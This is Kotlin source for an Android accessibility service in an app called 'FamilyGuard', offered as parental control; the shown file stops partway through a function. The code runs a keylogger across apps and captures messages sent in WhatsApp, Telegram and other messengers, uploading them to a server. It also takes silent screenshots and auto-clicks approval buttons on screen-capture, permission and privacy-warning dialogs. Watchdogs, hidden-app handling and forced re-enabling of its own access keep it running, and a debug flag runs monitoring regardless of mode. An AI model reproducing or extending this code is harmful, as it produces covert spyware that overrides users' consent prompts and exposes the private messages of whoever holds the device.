package com.familyguardpro.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.util.Base64
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.DeviceUtils
import com.familyguardpro.utils.FcmTokenManager
import com.familyguardpro.utils.KeystrokeBuffer
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream

/**
 * CORE Accessibility Service - The PRIMARY service for FamilyGuard
 * 
 * This is the CORE of the application architecture (like AirDroid).
 * Accessibility Services have special protection in Android OS:
 * - MIUI is less aggressive killing them than generic foreground services
 * - They're considered "system-level" features
 * - Disabling them affects system accessibility features
 * 
 * This service:
 * 1. Starts ALL other monitoring services
 * 2. Starts the watchdog system (JobScheduler + AlarmManager)
 * 3. Cross-monitors other services
 * 4. Self-restarts if killed
 */
class FamilyGuardAccessibilityService : AccessibilityService() {
    
    companion object {
        private const val TAG = "AccessibilityService"
        
        @Volatile
        var instance: FamilyGuardAccessibilityService? = null
            private set
        
        /**
         * Check if Accessibility Service is currently running
         * Used by watchdogs to detect service death
         */
        fun isRunning(): Boolean = instance != null
        
        // Flag to enable/disable auto-approval for screen capture
        var autoApproveScreenCapture = false
        
        // Flag to trigger screenshot capture
        var pendingScreenshotCapture = false
        
        // Flag to enable/disable keystroke monitoring
        var keystrokeMonitoringEnabled = true
        
        // System UI package names for MediaProjection dialog only
        private val SYSTEM_UI_PACKAGES = listOf(
            // Stock Android / Google
            "com.android.systemui",
            "android",
            "com.android.permissioncontroller",
            "com.android.packageinstaller",
            "com.google.android.permissioncontroller",
            "com.android.settings",
            
            // Samsung One UI
            "com.samsung.android.app.cocktailbarservice",
            "com.samsung.android.oneui.home",
            "com.samsung.android.permissioncontroller",
            
            // Xiaomi MIUI / HyperOS
            "com.miui.securitycenter",
            "com.miui.securityadd",
            "com.miui.powerkeeper",
            "com.miui.permcenter",
            "com.miui.home",
            
            // OPPO / Realme ColorOS
            "com.coloros.safecenter",
            "com.oppo.safe",
            "com.color.safecenter",
            "com.coloros.securepay",
            
            // Vivo FuntouchOS / OriginOS
            "com.vivo.permissionmanager",
            "com.iqoo.secure",
            "com.vivo.safecenter",
            
            // OnePlus OxygenOS / ColorOS
            "com.oneplus.security",
            "net.oneplus.permissioncontroller",
            
            // Huawei EMUI / HarmonyOS
            "com.huawei.systemmanager",
            "com.huawei.permissionmanager"
        )
        
        // Messaging apps with special contact extraction
        private val MESSAGING_APPS = mapOf(
            "com.whatsapp" to "WhatsApp",
            "com.whatsapp.w4b" to "WhatsApp Business",
            "org.telegram.messenger" to "Telegram",
            "org.telegram.messenger.web" to "Telegram",
            "com.instagram.android" to "Instagram",
            "com.facebook.orca" to "Messenger",
            "com.facebook.mlite" to "Messenger Lite",
            "com.snapchat.android" to "Snapchat",
            "jp.naver.line.android" to "LINE",
            "com.viber.voip" to "Viber",
            "com.discord" to "Discord",
            "com.Slack" to "Slack",
            "com.twitter.android" to "Twitter",
            "com.zhiliaoapp.musically" to "TikTok",
            "com.ss.android.ugc.trill" to "TikTok"
        )
        
        // Browser packages for URL context
        private val BROWSER_PACKAGES = listOf(
            "com.android.chrome",
            "com.chrome.beta",
            "org.mozilla.firefox",
            "com.opera.browser",
            "com.microsoft.emmx",
            "com.brave.browser"
        )
        
        // System packages to skip (major lag source)
        private val SYSTEM_PACKAGES = setOf(
            "com.android.systemui",
            "com.google.android.systemui",
            "android",
            "com.android.launcher",
            "com.android.launcher3",
            "com.miui.home",
            "com.google.android.apps.nexuslauncher"
        )
        
        // Device Admin settings page detection - block access to prevent disabling
        private val DEVICE_ADMIN_ACTIVITY_PATTERNS = listOf(
            "DeviceAdminSettings",
            "deviceadminsettings", 
            "DeviceAdminAdd",
            "device_admin",
            "DeviceAdmin"
        )
        
        // Throttling constants
        private const val CONTENT_CHANGE_THROTTLE_MS = 300L  // 300ms throttle
        private const val TEXT_CHANGE_THROTTLE_MS = 200L     // 200ms throttle
        private const val ROOT_NODE_CACHE_MS = 1000L         // Cache rootNode for 1 second
        
        // Password field indicators
        private val PASSWORD_FIELD_HINTS = listOf(
            "password", "contraseña", "mot de passe", "passwort", 
            "senha", "парол", "密码", "パスワード"
        )
        
        // Button text patterns to click for approval (multi-language support)
        // EXPANDED for privacy dialogs, permission dialogs, and all OEMs
        private val APPROVE_BUTTON_TEXTS = listOf(
            // English - Primary
            "start now", "start", "allow", "accept", "ok", "okay", "yes", 
            "continue", "got it", "i understand", "proceed", "enable",
            "grant", "permit", "agree", "confirm", "turn on", "activate",
            "while using the app", "only this time", "always allow",
            
            // Continue sharing variations (Vivo/other OEM screen share dialogs)
            "continue sharing", "continue streaming", "continue casting",
            "keep sharing", "keep streaming", "resume sharing", "resume streaming",
            "share anyway", "continue recording", "keep recording",
            
            // Spanish
            "iniciar ahora", "iniciar", "permitir", "aceptar", "continuar",
            "entendido", "habilitar", "activar",
            
            // French
            "démarrer", "autoriser", "accepter", "continuer", "j'ai compris",
            "activer", "d'accord",
            
            // German
            "starten", "erlauben", "zulassen", "akzeptieren", "weiter",
            "verstanden", "aktivieren", "einschalten",
            
            // Italian
            "avvia", "consenti", "accetta", "continua", "capito", "attiva",
            
            // Portuguese
            "iniciar agora", "permitir", "aceitar", "continuar", "entendi",
            "ativar",
            
            // Turkish
            "başlat", "izin ver", "kabul et", "devam",
            
            // Chinese (Simplified & Traditional)
            "開始", "許可", "允许", "开始", "同意", "继续", "确定", "好的",
            "始终允许", "仅此一次", "使用时允许",
            
            // Japanese
            "開始", "許可", "同意する", "続行",
            
            // Korean
            "시작", "허용", "동의", "계속", "확인",
            
            // Arabic
            "ابدأ", "سماح", "موافق", "متابعة",
            
            // Hindi
            "शुरू", "अनुमति", "स्वीकार करें", "जारी रखें",
            
            // Indonesian
            "mulai", "izinkan", "setuju", "lanjutkan",
            
            // Russian
            "начать", "разрешить", "принять", "продолжить", "понятно"
        )
        
        // Privacy/Permission dialog keywords to detect dialogs that need auto-dismiss
        private val PRIVACY_DIALOG_KEYWORDS = listOf(
            // Screen capture/recording
            "will start capturing", "start capturing", "record", "share your screen",
            "screen capture", "cast", "projection", "mirror", "screen recording",
            "wants to capture", "access to screen", "display over other apps",
            
            // Privacy warnings
            "privacy", "hidden", "protected", "sensitive", "secure",
            "privacy app hidden", "sensitive content", "protected content",
            
            // Permission dialogs
            "permission", "access", "allow", "grant",
            
            // Accessibility warnings
            "accessibility", "full control", "observe your actions",
            
            // Admin/system dialogs
            "device admin", "administrator",
            
            // Protecting overlay/notification (Vivo and other OEMs)
            "protecting", "protection", "shared screen", "being recorded",
            "screen is being shared", "screen is being recorded",
            "currently sharing", "currently streaming", "currently casting"
        )
        
        // Keywords for expandable overlays that need to be clicked FIRST to reveal buttons
        // These are notifications/overlays that show "Protecting your privacy" etc
        private val EXPANDABLE_OVERLAY_KEYWORDS = listOf(
            "protecting", "protection", "privacy protected", "tap to",
            "tap for options", "click for more", "expand",
            "screen sharing", "being shared", "being recorded"
        )
        
        // Resource IDs for approve buttons across different OEMs
        private val APPROVE_BUTTON_IDS = listOf(
            // Stock Android
            "android:id/button1",
            "com.android.systemui:id/start_now",
            "com.android.systemui:id/button_start",
            "com.android.systemui:id/positive_button",
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "com.android.permissioncontroller:id/continue_button",
            
            // Samsung One UI
            "com.samsung.android:id/allow_button",
            "com.samsung.android:id/button1",
            
            // Xiaomi MIUI
            "miui:id/button1",
            "miui:id/consent_button",
            "com.miui.securitycenter:id/permission_allow",
            
            // OPPO/Realme ColorOS
            "com.coloros.safecenter:id/btn_allow",
            "com.oppo.safe:id/permission_allow",
            
            // Vivo
            "com.vivo.permissionmanager:id/allow_button",
            
            // OnePlus
            "com.oneplus.security:id/permission_allow"
        )
        
        // Checkbox text patterns for "Don't show again"
        private val DONT_SHOW_AGAIN_TEXTS = listOf(
            "don't show again", "don't ask again", "remember", 
            "no volver a mostrar", "ne plus afficher",
            "nicht mehr anzeigen", "nicht erneut fragen",
            "不再显示", "不再提示", "记住选择"
        )
        
        /**
         * Request screenshot capture via Accessibility Service
         * This is silent and doesn't require user interaction (Android 9+)
         */
        fun captureScreenshot() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                instance?.takeScreenshotSilently()
            } else {
                Log.w(TAG, "Silent screenshot requires Android 9+")
                pendingScreenshotCapture = true
            }
        }
    }
    
    private val handler = Handler(Looper.getMainLooper())
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var keystrokeBuffer: KeystrokeBuffer
    private lateinit var browserHistoryTracker: BrowserHistoryTracker
    private lateinit var keystrokeCorrelator: SmartKeystrokeCorrelator
    private var currentContactName: String = "Unknown"
    private var lastTextContent: String = ""
    
    // Social media SENT message tracking
    private var lastSocialMediaText: String = ""
    private var lastSocialMediaPackage: String = ""
    private var lastSocialMediaContact: String = ""
    private var lastSocialMediaTextTime: Long = 0
    private val SENT_MESSAGE_THRESHOLD_MS = 500 // If text clears within 500ms, consider it sent
    
    // Performance optimization: Throttling timestamps
    private var lastContentChangeTime = 0L
    private var lastTextChangeTime = 0L
    
    // Performance optimization: Cache rootNode (expensive operation)
    private var cachedRootNode: AccessibilityNodeInfo? = null
    private var rootNodeCacheTime = 0L
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        keystrokeBuffer = KeystrokeBuffer.getInstance(applicationContext)
        browserHistoryTracker = BrowserHistoryTracker(this)
        keystrokeCorrelator = SmartKeystrokeCorrelator(this)
        Log.d(TAG, "CORE Accessibility service connected - starting all services")
        
        // Set up callback for when a complete message is ready (after debounce)
        keystrokeBuffer.setOnMessageCompleteListener { completedKeystroke ->
            Log.d(TAG, "✅ Complete message ready: ${completedKeystroke.contactName} - '${completedKeystroke.textContent.take(50)}...'")
            
            // Sync the complete message to server
            serviceScope.launch {
                try {
                    val app = applicationContext as? FamilyGuardApp
                    val deviceId = app?.preferenceManager?.getDeviceId() ?: return@launch
                    syncKeystrokesImmediately(deviceId)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to sync complete message: ${e.message}")
                }
            }
        }
        
        // PERFORMANCE OPTIMIZED: Reduced event types and increased timeout
        serviceInfo = serviceInfo.apply {
            // Added TYPE_VIEW_CLICKED for send button detection (keystroke correlation)
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            // Removed FLAG_INCLUDE_NOT_IMPORTANT_VIEWS (reduces unnecessary events)
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                   AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            notificationTimeout = 150 // Increased from 50ms (less aggressive)
        }
        
        // CORE SERVICE RESPONSIBILITY: Start all monitoring services
        startAllMonitoringServices()
        
        // Start the triple-redundancy watchdog system
        startWatchdogSystem()
        
        // Ensure DO accessibility auto-recovery is active
        try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
            if (doManager.isDeviceOwner()) {
                // Force-write accessibility setting on service connect to cement it
                doManager.forceEnableAccessibility()
                // Start DO accessibility monitor for continuous protection
                com.familyguardpro.deviceowner.DOAccessibilityMonitor.startMonitoring(this)
                Log.d(TAG, "DO accessibility protection activated on service connect")
            }
        } catch (e: Exception) {
            Log.d(TAG, "DO accessibility protection not applicable: ${e.message}")
        }
    }
    
    /**
     * Start all monitoring services from the CORE Accessibility Service
     * This is the heart of the AirDroid-style architecture
     */
    private fun startAllMonitoringServices() {
        Log.d(TAG, "Starting all monitoring services from CORE")
        
        try {
            // Start PersistentService (foreground service for notification + monitors)
            val persistentIntent = Intent(this, PersistentService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(persistentIntent)
            } else {
                startService(persistentIntent)
            }
            Log.d(TAG, "PersistentService started from CORE")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start PersistentService: ${e.message}")
        }
        
        try {
            // Start WebSocketSyncService for real-time communication
            WebSocketSyncService.start(this)
            Log.d(TAG, "WebSocketSyncService started from CORE")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start WebSocketSyncService: ${e.message}")
        }
        
        try {
            // Start LocationService for location tracking
            val locationIntent = Intent(this, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(locationIntent)
            } else {
                startService(locationIntent)
            }
            Log.d(TAG, "LocationService started from CORE")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start LocationService: ${e.message}")
        }
        
        try {
            // Start BrowserHistoryService for web monitoring
            val browserIntent = Intent(this, BrowserHistoryService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(browserIntent)
            } else {
                startService(browserIntent)
            }
            Log.d(TAG, "BrowserHistoryService started from CORE")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start BrowserHistoryService: ${e.message}")
        }
    }
    
    /**
     * Start the triple-redundancy watchdog system:
     * 1. JobScheduler (ServiceWatchdog) - Primary, every 5 min
     * 2. AlarmManager (AlarmManagerWatchdog) - Fallback, every 10 min
     * 3. AccessibilityService self-restart - Last resort
     */
    private fun startWatchdogSystem() {
        Log.d(TAG, "Starting triple-redundancy watchdog system")
        
        // 1. Start JobScheduler-based watchdog (primary)
        ServiceWatchdog.schedule(this)
        
        // 2. Start AlarmManager-based watchdog (fallback for MIUI)
        AlarmManagerWatchdog.schedule(this)
        
        // 3. Schedule periodic self-check
        scheduleAccessibilitySelfCheck()
        
        // 4. Refresh FCM token immediately to ensure connectivity
        FcmTokenManager.init(this)
        
        // 5. Schedule periodic FCM token refresh (every 30 minutes)
        scheduleFcmTokenRefresh()
        
        // If on MIUI, increase monitoring frequency
        if (DeviceUtils.isMiui()) {
            Log.d(TAG, "MIUI detected - using aggressive monitoring")
            AlarmManagerWatchdog.scheduleImmediateCheck(this, 1000) // Check after 1 second
        }
    }
    
    /**
     * Schedule periodic self-check using Handler
     * This ensures Accessibility Service monitors itself and services
     */
    private fun scheduleAccessibilitySelfCheck() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                Log.d(TAG, "Accessibility self-check running")
                
                // Check if PersistentService is running
                if (!PersistentService.isRunning) {
                    Log.w(TAG, "PersistentService dead - restarting from CORE")
                    startAllMonitoringServices()
                }
                
                // Check if WebSocketSyncService is running
                if (!WebSocketSyncService.isRunning()) {
                    Log.w(TAG, "WebSocketSyncService dead - restarting from CORE")
                    WebSocketSyncService.start(this@FamilyGuardAccessibilityService)
                }
                
                // Proactively re-write accessibility setting to prevent system from disabling
                try {
                    val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this@FamilyGuardAccessibilityService)
                    if (doManager.isDeviceOwner()) {
                        // Periodically ensure accessibility is still written in settings
                        val enabled = com.familyguardpro.utils.AccessibilityMonitor.isAccessibilityEnabled(this@FamilyGuardAccessibilityService)
                        if (!enabled) {
                            Log.w(TAG, "Self-check: Accessibility disabled! Force re-enabling...")
                            doManager.forceEnableAccessibility()
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Self-check DO re-enable error", e)
                }
                
                // Re-schedule self-check every 60 seconds (more aggressive)
                handler.postDelayed(this, 60_000)
            }
        }, 30_000) // First check after 30 seconds
    }
    
    /**
     * Schedule periodic FCM token refresh to ensure token is always valid
     * This runs every 30 minutes from the CORE accessibility service
     * Critical for when app is hidden and never opened
     */
    private fun scheduleFcmTokenRefresh() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                Log.d(TAG, "Periodic FCM token refresh from CORE")
                
                try {
                    // Refresh the FCM token
                    FcmTokenManager.refreshTokenAsync()
                    Log.d(TAG, "FCM token refresh triggered from CORE AccessibilityService")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to refresh FCM token: ${e.message}")
                }
                
                // Re-schedule every 30 minutes
                handler.postDelayed(this, 30 * 60 * 1000L)
            }
        }, 5 * 60 * 1000L) // First refresh after 5 minutes
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        
        val packageName = event.packageName?.toString() ?: return
        
        // PERFORMANCE FIX #1: Skip own app
        if (packageName == applicationContext.packageName) return
        
        // NOTE: Device admin blocking DISABLED during setup
        // User needs to grant device admin permission
        // if (packageName == "com.android.settings" && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
        //     val className = event.className?.toString() ?: ""
        //     if (isDeviceAdminSettingsPage(className)) {
        //         Log.d(TAG, "⚠️ BLOCKING Device Admin settings access: $className")
        //         blockDeviceAdminAccess()
        //         return
        //     }
        // }
        
        // BROWSER HISTORY: Track URLs from browser address bars (bypasses Chrome ContentProvider block)
        if (browserHistoryTracker.isBrowserPackage(packageName)) {
            browserHistoryTracker.onAccessibilityEvent(event, packageName)
            // Continue processing for other features
        }
        
        // PERFORMANCE FIX #2: Skip system apps (major lag culprit!)
        if (SYSTEM_PACKAGES.any { packageName.startsWith(it) }) {
            // Exception: Allow MediaProjection dialog handling only
            if (autoApproveScreenCapture && isSystemUIPackage(packageName)) {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                        handleMediaProjectionDialog(event)
                    }
                }
            }
            return
        }
        
        val app = applicationContext as? FamilyGuardApp
        // DEBUG: Allow monitoring even if not in child mode (for testing)
        val isChildModeOrDebug = app?.preferenceManager?.isChildMode() == true || true // TODO: Remove true for production
        if (!isChildModeOrDebug) {
            return
        }
        
        val currentTime = System.currentTimeMillis()
        
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // This is fine - fires rarely (only on window changes)
                handleAppOpened(packageName)
                
                // CRITICAL FIX: Clear rootNode cache when window changes (new chat opened)
                // This prevents using stale contact names when switching between contacts
                clearRootNodeCache()
                
                updateContactContext(packageName, event)
            }
            
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // PERFORMANCE FIX #3: Throttle (only process every 300ms)
                if (currentTime - lastContentChangeTime < CONTENT_CHANGE_THROTTLE_MS) {
                    return
                }
                
                // PERFORMANCE FIX #4: Only process messaging apps
                if (!MESSAGING_APPS.containsKey(packageName)) {
                    return
                }
                
                lastContentChangeTime = currentTime
                
                // PERFORMANCE FIX #5: Process in background thread
                serviceScope.launch(Dispatchers.IO) {
                    try {
                        android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND)
                        updateContactContext(packageName, event)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error updating contact context", e)
                    }
                }
            }
            
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // PERFORMANCE FIX #6: Throttle text changes
                if (currentTime - lastTextChangeTime < TEXT_CHANGE_THROTTLE_MS) {
                    return
                }
                
                lastTextChangeTime = currentTime
                
                // CRITICAL FIX: For messaging apps, ALWAYS get fresh contact name before processing text
                // This ensures message is attributed to the correct contact when user switches chats
                if (MESSAGING_APPS.containsKey(packageName)) {
                    forceUpdateContactContext(packageName)
                }
                
                // Process keystroke monitoring
                if (keystrokeMonitoringEnabled) {
                    handleTextChanged(packageName, event)
                }
            }
            
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Pass click events to correlator for send button detection (messaging apps only)
                if (keystrokeCorrelator.isMessagingApp(packageName)) {
                    keystrokeCorrelator.onAccessibilityEvent(event)
                }
            }
        }
    }
    
    /**
     * Handles text changes in input fields - captures keystrokes with DEBOUNCING
     * Also captures SENT messages for social media apps
     */
    private fun handleTextChanged(packageName: String, event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString("") ?: ""
            val currentTime = System.currentTimeMillis()
            val isSocialMediaApp = MESSAGING_APPS.containsKey(packageName)
            
            // Check if this is a social media app and text just cleared (message was sent)
            if (isSocialMediaApp && text.isEmpty() && lastSocialMediaText.isNotEmpty()) {
                val timeSinceLastText = currentTime - lastSocialMediaTextTime
                
                // If text cleared within 3 seconds after typing, it was likely sent
                if (timeSinceLastText < 3000 && lastSocialMediaPackage == packageName) {
                    // Capture as SENT message
                    Log.d(TAG, "📤 SENT message detected in $packageName: '${lastSocialMediaText.take(30)}...'")
                    
                    val app = applicationContext as? FamilyGuardApp
                    val deviceId = app?.preferenceManager?.getDeviceId()
                    
                    // Use "Me" as fallback if contact unknown
                    val contactToUse = if (lastSocialMediaContact.isNotBlank() && lastSocialMediaContact != "Unknown") 
                        lastSocialMediaContact else currentContactName.ifBlank { "Unknown Chat" }
                    
                    if (deviceId != null && lastSocialMediaText.length > 0) {
                        serviceScope.launch {
                            uploadSentSocialMessage(
                                deviceId = deviceId,
                                packageName = lastSocialMediaPackage,
                                appName = MESSAGING_APPS[lastSocialMediaPackage] ?: "Unknown",
                                contactName = contactToUse,
                                messageText = lastSocialMediaText,
                                timestamp = lastSocialMediaTextTime
                            )
                        }
                    }
                    
                    // Clear tracking
                    lastSocialMediaText = ""
                    lastSocialMediaPackage = ""
                    lastSocialMediaContact = ""
                }
                return
            }
            
            if (text.isEmpty()) return
            
            // Skip if we've already processed this exact text
            if (text == lastTextContent) return
            lastTextContent = text
            
            val sourceNode = event.source
            val fieldType = determineFieldType(sourceNode, event)
            
            // Redact password fields  
            if (fieldType == "password") {
                Log.d(TAG, "Skipping password field")
                sourceNode?.recycle()
                return
            }
            
            // Track social media typing for SENT message detection
            if (isSocialMediaApp && (fieldType == "message" || fieldType == "text")) {
                lastSocialMediaText = text
                lastSocialMediaPackage = packageName
                lastSocialMediaContact = currentContactName
                lastSocialMediaTextTime = currentTime
                Log.d(TAG, "📝 Tracking text: '${text.take(30)}...' for $currentContactName")
                
                // Also pass to SmartKeystrokeCorrelator for complete hybrid tracking
                keystrokeCorrelator.onTextChanged(
                    appPackage = packageName,
                    appName = MESSAGING_APPS[packageName] ?: "Unknown",
                    context = currentContactName,
                    newText = text,
                    isPassword = (fieldType == "password")
                )
            }
            
            // Get app name
            val appName = getAppName(packageName)
            
            // Get device ID
            val app = applicationContext as? FamilyGuardApp
            val deviceId = app?.preferenceManager?.getDeviceId() ?: return
            
            // Add to buffer (debouncing handled internally)
            keystrokeBuffer.addKeystroke(
                deviceId = deviceId,
                packageName = packageName,
                appName = appName,
                contactName = currentContactName,
                textContent = text,
                fieldType = fieldType
            )
            
            sourceNode?.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "Error handling text changed: ${e.message}")
        }
    }
    
    /**
     * Upload a SENT social media message to the server
     */
    private suspend fun uploadSentSocialMessage(
        deviceId: String,
        packageName: String,
        appName: String,
        contactName: String,
        messageText: String,
        timestamp: Long
    ) {
        try {
            val messageData = mapOf(
                "deviceId" to deviceId,
                "appPackage" to packageName,
                "appName" to appName,
                "contactName" to contactName,
                "contactIdentifier" to contactName, // Same as contactName for now
                "messageText" to messageText,
                "timestamp" to timestamp,
                "messageType" to "SENT",
                "isGroupChat" to false
            )
            
            val response = ApiClient.api.uploadSocialMediaMessage(messageData)
            
            if (response.isSuccessful) {
                Log.d(TAG, "✅ SENT message uploaded successfully")
            } else {
                Log.e(TAG, "Failed to upload SENT message: ${response.code()}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading SENT message: ${e.message}")
        }
    }
    
    /**
     * Determines the type of input field
     */
    private fun determineFieldType(node: AccessibilityNodeInfo?, event: AccessibilityEvent): String {
        if (node == null) return "text"
        
        // Check if password field
        if (node.isPassword) return "password"
        
        // Check hint text for password indicators
        val hintText = node.hintText?.toString()?.lowercase() ?: ""
        val viewIdRes = node.viewIdResourceName?.lowercase() ?: ""
        
        if (PASSWORD_FIELD_HINTS.any { hintText.contains(it) || viewIdRes.contains(it) }) {
            return "password"
        }
        
        // Check for search fields
        if (viewIdRes.contains("search") || hintText.contains("search") || hintText.contains("buscar")) {
            return "search"
        }
        
        // Check for message/chat input
        if (viewIdRes.contains("message") || viewIdRes.contains("chat") || 
            viewIdRes.contains("compose") || viewIdRes.contains("entry") ||
            hintText.contains("message") || hintText.contains("type")) {
            return "message"
        }
        
        // Check for comment fields
        if (viewIdRes.contains("comment") || hintText.contains("comment") || 
            hintText.contains("reply")) {
            return "comment"
        }
        
        return "text"
    }
    
    /**
     * Sync keystrokes immediately to server (for testing)
     */
    private suspend fun syncKeystrokesImmediately(deviceId: String) {
        try {
            val keystrokes = keystrokeBuffer.getAndClearBuffer()
            
            if (keystrokes.isEmpty()) {
                Log.d(TAG, "No keystrokes to sync immediately")
                return
            }
            
            Log.d(TAG, "🚀 IMMEDIATE SYNC: Sending ${keystrokes.size} keystrokes to server...")
            
            val request = com.familyguardpro.models.KeystrokeBatchRequest(
                deviceId = deviceId,
                keystrokes = keystrokes
            )
            
            val response = ApiClient.api.uploadKeystrokes(request)
            
            if (response.isSuccessful) {
                Log.d(TAG, "✅ IMMEDIATE SYNC SUCCESS: ${keystrokes.size} keystrokes synced!")
            } else {
                Log.e(TAG, "❌ IMMEDIATE SYNC FAILED: ${response.code()} - ${response.message()}")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ IMMEDIATE SYNC ERROR: ${e.message}")
        }
    }
    
    /**
     * Updates the current contact context from the UI
     * PERFORMANCE OPTIMIZED: Caches rootNode for 1 second to avoid expensive traversals
     */
    private fun updateContactContext(packageName: String, event: AccessibilityEvent) {
        try {
            val currentTime = System.currentTimeMillis()
            
            // PERFORMANCE FIX #7: Cache rootNode for 1 second (expensive operation!)
            val rootNode = if (currentTime - rootNodeCacheTime < ROOT_NODE_CACHE_MS && cachedRootNode != null) {
                cachedRootNode!! // Use cached
            } else {
                // Get fresh rootNode and cache it
                val freshNode = rootInActiveWindow ?: return
                
                // Clean old cache
                try {
                    cachedRootNode?.recycle()
                } catch (e: Exception) {
                    // Ignore recycle errors
                }
                
                cachedRootNode = freshNode
                rootNodeCacheTime = currentTime
                freshNode
            }
            
            // Try to extract contact/chat name based on app
            val contactName = when {
                MESSAGING_APPS.containsKey(packageName) -> extractMessagingContact(rootNode, packageName)
                BROWSER_PACKAGES.contains(packageName) -> extractBrowserContext(rootNode)
                else -> null // Skip generic apps - reduces processing
            }
            
            if (contactName != null && contactName.isNotBlank() && contactName != "Unknown") {
                currentContactName = contactName
                Log.d(TAG, "Updated contact context: $contactName in ${MESSAGING_APPS[packageName] ?: packageName}")
            }
            
            // Note: Don't recycle cached rootNode here - it's reused
        } catch (e: Exception) {
            Log.e(TAG, "Error updating contact context: ${e.message}")
        }
    }
    
    /**
     * CRITICAL FIX: Clear the rootNode cache
     * Called when window state changes (user switches chats/contacts)
     * This ensures fresh contact extraction on the next access
     */
    private fun clearRootNodeCache() {
        try {
            cachedRootNode?.recycle()
        } catch (e: Exception) {
            // Ignore recycle errors
        }
        cachedRootNode = null
        rootNodeCacheTime = 0L
        Log.d(TAG, "🧹 RootNode cache cleared (window changed)")
    }
    
    /**
     * CRITICAL FIX: Force update contact context for messaging apps
     * Called before processing text changes to ensure correct contact attribution
     * Bypasses the cache to get fresh contact name from current UI
     */
    private fun forceUpdateContactContext(packageName: String) {
        try {
            clearRootNodeCache()
            
            var rootNode = rootInActiveWindow
            
            // If rootNode is from keyboard, try to get correct app window
            if (rootNode != null && rootNode.packageName?.toString() != packageName) {
                for (window in windows ?: emptyList()) {
                    val windowRoot = window.root
                    if (windowRoot?.packageName?.toString() == packageName) {
                        rootNode = windowRoot
                        break
                    }
                }
            }
            
            if (rootNode == null) return
            
            cachedRootNode = rootNode
            rootNodeCacheTime = System.currentTimeMillis()
            
            val contactName = extractMessagingContact(rootNode, packageName)
            
            if (contactName != null && contactName.isNotBlank() && contactName != "Unknown") {
                if (currentContactName != contactName) {
                    Log.d(TAG, "🔄 Contact switched: $currentContactName -> $contactName")
                }
                currentContactName = contactName
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error force updating contact context: ${e.message}")
        }
    }

    /**
     * Extracts contact name from messaging apps
     * IMPROVED: App-specific patterns with noise filtering
     */
    private fun extractMessagingContact(rootNode: AccessibilityNodeInfo, packageName: String): String {
        // App-specific extraction (most reliable)
        when (packageName) {
            "com.whatsapp", "com.whatsapp.w4b" -> {
                // Try all known WhatsApp conversation title view IDs
                val whatsappIds = listOf(
                    "com.whatsapp:id/conversation_contact_name",  // Individual chat
                    "com.whatsapp:id/conversation_title",          // Newer versions
                    "com.whatsapp:id/group_name",                  // Group chat specific
                    "com.whatsapp:id/conversation_group_name",     // Group chat alternative
                    "com.whatsapp:id/action_bar_title"             // Fallback action bar
                )
                for (viewId in whatsappIds) {
                    val result = findValidContactInViewId(rootNode, viewId)
                    if (result != null) {
                        Log.d(TAG, "📱 WhatsApp contact from $viewId: $result")
                        return result
                    }
                }
                
                // Fallback: Try to find ANY TextView in action bar that contains valid name
